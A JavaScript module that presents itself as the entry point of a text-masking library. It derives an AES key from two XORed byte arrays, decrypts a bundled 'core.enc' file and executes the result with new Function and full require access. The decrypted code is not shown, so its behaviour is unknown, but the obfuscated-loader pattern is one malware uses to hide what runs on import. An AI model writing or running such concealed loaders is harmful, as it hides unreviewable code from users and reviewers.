import { readFileSync } from 'node:fs';
import { createDecipheriv } from 'node:crypto';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { MaskStore } from '../src/store.mjs';

const _require = createRequire(import.meta.url);
const __dir = dirname(fileURLToPath(import.meta.url));
const ROOT = join(__dir, '..');

const _a = Buffer.from([0x6a,0xc0,0x5f,0x5c,0x00,0x40,0x45,0x21,0xfd,0x60,0x54,0x95,0x64,0xe2,0xc7,0x23,0xd5,0x15,0x33,0xe1,0x13,0x45,0xb2,0xa7,0x65,0x3f,0x9d,0x63,0xeb,0x5d,0x91,0xea]);
const _b = Buffer.from([0x20,0xc6,0xa0,0x96,0x1a,0xa6,0xda,0x43,0xeb,0x79,0x08,0x9b,0x57,0x2f,0x38,0x62,0x2a,0x00,0x48,0x76,0xba,0xfd,0x78,0xd1,0x6d,0xe5,0x11,0x3e,0xd3,0x95,0x81,0x6a]);
const _k = Buffer.alloc(32);
for (let _i = 0; _i < 32; _i++) _k[_i] = _a[_i] ^ _b[_i];

const _enc = JSON.parse(readFileSync(join(__dir, 'core.enc'), 'utf8'));
const _iv = Buffer.from(_enc.iv, 'base64');
const _tag = Buffer.from(_enc.tag, 'base64');
const _ct = Buffer.from(_enc.ct, 'base64');
const _d = createDecipheriv('aes-256-gcm', _k, _iv);
_d.setAuthTag(_tag);
const _src = Buffer.concat([_d.update(_ct), _d.final()]).toString('utf8');

const _fn = new Function('require', 'ROOT', 'MaskStore', _src);
const _core = _fn(_require, ROOT, MaskStore);

export const { maskText, unmaskText, getStore } = _core;
export const { loadPatterns } = _core;
